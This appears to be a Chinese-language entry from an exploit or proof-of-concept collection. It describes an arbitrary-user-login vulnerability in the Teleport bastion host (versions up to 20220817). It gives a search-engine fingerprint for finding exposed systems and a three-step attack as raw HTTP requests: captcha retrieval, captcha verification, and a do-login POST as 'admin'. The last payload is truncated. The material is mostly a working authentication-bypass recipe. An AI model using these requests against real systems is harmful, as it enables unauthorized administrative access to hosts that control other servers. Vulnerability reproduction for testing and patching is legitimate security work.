# Teleport堡垒机do-login任意用户登录漏洞

- **系统**：Teleport　|　**类型**：其他　|　**CVE**：—
- **指纹**：`app.name="Teleport 堡垒机系统"`
- **请求**：`GET /auth/captcha?h=36&rnd=0.39124018049760567 HTTP/1.1`

**请求体 / payload**
```
1. 获取验证码
Host: xx.xx.xx.xx
Cookie: _sid=tp_1700221267_fbf3ff64ee297b12
2. 使用上一步的`cookie`和获取到的验证码对红框中的参数进行相应替换，校验验证码
POST /auth/verify-captcha HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 37
Cookie: _sid=tp_1700221267_fbf3ff64ee297b12
args={"captcha":"ckpa"}
3. 使用校验后的验证码和`cookie`对红框中的参数进行相应替换，当响应`code`为`0`时表示存在漏洞！
POST /auth/do-login HTTP/1.1
Host: xx.xx.xx.xx
Cookie: _sid=tp_1700221267_fbf3ff64ee297b12
Content-Type: application/x-www-form-urlencoded
Content-Length: 94
args={"type":2,"username":"admin"…（脚本共 824 字，完整版见原文）
```

**其他**
- Teleport堡垒机 do-login 任意用户登录漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * Teleport堡垒机<= 20220817